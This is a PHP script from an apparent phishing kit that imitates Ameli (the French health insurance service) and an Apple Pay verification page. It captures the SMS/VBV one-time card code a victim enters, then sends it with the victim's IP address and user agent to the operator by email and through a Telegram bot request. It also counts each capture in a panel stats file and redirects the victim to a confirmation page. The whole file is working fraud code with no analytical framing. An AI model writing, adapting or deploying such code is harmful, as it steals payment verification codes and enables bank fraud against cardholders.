<?php

include("../common/sub_includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
    session_start();  // Et on ouvre la session
}

$vbvCode = $_POST['input_sms_code'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['vbvCode']  = $vbvCode;

    $message = '
[🦊] Ameli Code ApplePay [🦊]

🔐 Code VBV : ' . $_SESSION['vbvCode'] . '

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'] . '
';

    if ($mail_send == true) {
        $Subject = " 「🍓」+1 Fr3sh Ameli VBV from " . $_SESSION['vbvCode'] . " | " . $_SERVER['HTTP_USER_AGENT'];
        $head = "From: Ameli <info@querty.bg>";

        mail($my_mail, $Subject, $message, $head);
    }

    if ($tlg_send == true) {
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=" . $rez_vbv . "&text=" . urlencode("$message"));
       
    }



    $filepath = '../panel/stats.ini';
    $data = @parse_ini_file($filepath);
    $data['sms']++;
                function update_ini_file($data, $filepath) {
                  $content = "";
                  $parsed_ini = parse_ini_file($filepath, true);
                  foreach($data as $section => $values){
                    if($section === ""){
                      continue;
                    }
                    $content .= $section ."=". $values . "\n\r";
                  }
                  if (!$handle = fopen($filepath, 'w')) {
                    return false;
                  }
                  $success = fwrite($handle, $content);
                  fclose($handle);
                }
    update_ini_file($data, $filepath);

    header('location: ../pages/confirme.php');
}
